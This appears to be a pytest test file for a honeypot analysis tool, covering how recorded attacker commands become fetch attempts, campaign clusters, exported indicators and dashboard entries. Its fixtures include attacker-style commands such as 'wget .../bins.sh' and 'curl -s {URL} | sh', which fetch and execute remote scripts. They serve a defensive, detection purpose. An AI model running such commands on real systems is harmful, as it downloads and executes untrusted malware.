"""Attempted downloads: stored by the mapper, used by campaigns, the export and the dashboard."""

from datetime import UTC, datetime, timedelta

import pytest
from sqlalchemy import func, select

pytest.importorskip("flask")

from surya_kundal import campaigns as camp
from surya_kundal import export as ioc
from surya_kundal.dashboard import queries
from surya_kundal.database.engine import create_db_engine, init_db, make_session_factory
from surya_kundal.database.models import (
    Command,
    Download,
    FetchAttempt,
    HoneypotSession,
    Login,
)
from surya_kundal.mapping.store import map_pending, map_session

T0 = datetime(2026, 10, 1, 12, 0, tzinfo=UTC)
URL = "http://45.33.32.156/bins.sh"  # a public address, so the export accepts it


@pytest.fixture
def db(tmp_path):
    engine = create_db_engine(f"sqlite:///{tmp_path / 'f.db'}")
    init_db(engine)
    with make_session_factory(engine)() as session:
        yield session


def add(db, sid, ip, hours, commands):
    when = T0 + timedelta(hours=hours)
    db.add(HoneypotSession(id=sid, src_ip=ip, start_time=when))
    db.flush()
    db.add(Login(session_id=sid, username="root", password="x", success=True, timestamp=when))
    for n, command in enumerate(commands):
        db.add(Command(session_id=sid, command=command, timestamp=when + timedelta(seconds=n)))
    db.commit()


def attempts(db):
    return list(db.scalars(select(FetchAttempt).order_by(FetchAttempt.id)))


def test_mapping_stores_each_address_once_with_the_command_time(db):
    add(db, "s1", "80.66.76.1", 0, [f"wget {URL}", f"curl -O {URL}", "uname -a"])
    map_pending(db)
    rows = attempts(db)
    assert [(r.url, r.tool) for r in rows] == [(URL, "wget")]
    assert rows[0].timestamp == T0


def test_mapping_again_does_not_duplicate_and_new_commands_are_picked_up(db):
    add(db, "s1", "80.66.76.1", 0, [f"wget {URL}"])
    map_pending(db)
    map_session(db, "s1")
    db.commit()
    assert len(attempts(db)) == 1
    db.add(Command(session_id="s1", command="curl http://45.33.32.158/a", timestamp=T0))
    db.commit()
    map_pending(db)
    assert {r.url for r in attempts(db)} == {URL, "http://45.33.32.158/a"}


def test_attempts_are_removed_with_their_session(db):
    add(db, "s1", "80.66.76.1", 0, [f"wget {URL}"])
    map_pending(db)
    db.delete(db.get(HoneypotSession, "s1"))
    db.commit()
    assert db.scalar(select(func.count()).select_from(FetchAttempt)) == 0


def test_a_shared_attempted_address_links_campaign_facts(db):
    add(db, "s1", "80.66.76.1", 0, [f"wget {URL}"])
    add(db, "s2", "80.66.76.2", 5, [f"cd /tmp; curl -s {URL} | sh"])
    map_pending(db)
    facts = {f.id: f for f in camp.load_facts(db)}
    assert URL in facts["s1"].urls and URL in facts["s2"].urls
    assert sorted(sorted(c.session_ids) for c in camp.cluster(facts.values())) == [["s1", "s2"]]


def test_export_lists_attempted_urls_at_lower_confidence_and_counts_sessions_once(db):
    add(db, "s1", "80.66.76.1", 0, [f"wget {URL}"])
    add(db, "s2", "80.66.76.2", 5, ["wget http://45.33.32.157/z"])
    db.add(Download(session_id="s2", url="http://45.33.32.157/z", sha256="a" * 64, timestamp=T0))
    db.commit()
    map_pending(db)
    now = T0 + timedelta(days=1)
    indicators, _ = ioc.collect(db, now=now, filters=ioc.Filters(types=("url",)))
    by_url = {i.value: i for i in indicators}
    assert by_url[URL].confidence == 50 and by_url[URL].sessions == 1
    assert by_url["http://45.33.32.157/z"].confidence == 60
    assert by_url["http://45.33.32.157/z"].sessions == 1  # download and attempt: one session


def test_export_marks_a_session_that_only_attempted_a_fetch_as_action(db):
    add(db, "s1", "80.66.76.1", 0, [f"wget {URL}"])
    map_pending(db)
    indicators, _ = ioc.collect(
        db, now=T0 + timedelta(days=1), filters=ioc.Filters(types=("ip",), min_level="contact")
    )
    assert indicators[0].level == "action"


def test_session_detail_lists_attempts(db):
    add(db, "s1", "80.66.76.1", 0, [f"wget {URL}"])
    map_pending(db)
    detail = queries.session_detail(db, "s1")
    assert detail is not None and [a.url for a in detail.attempts] == [URL]
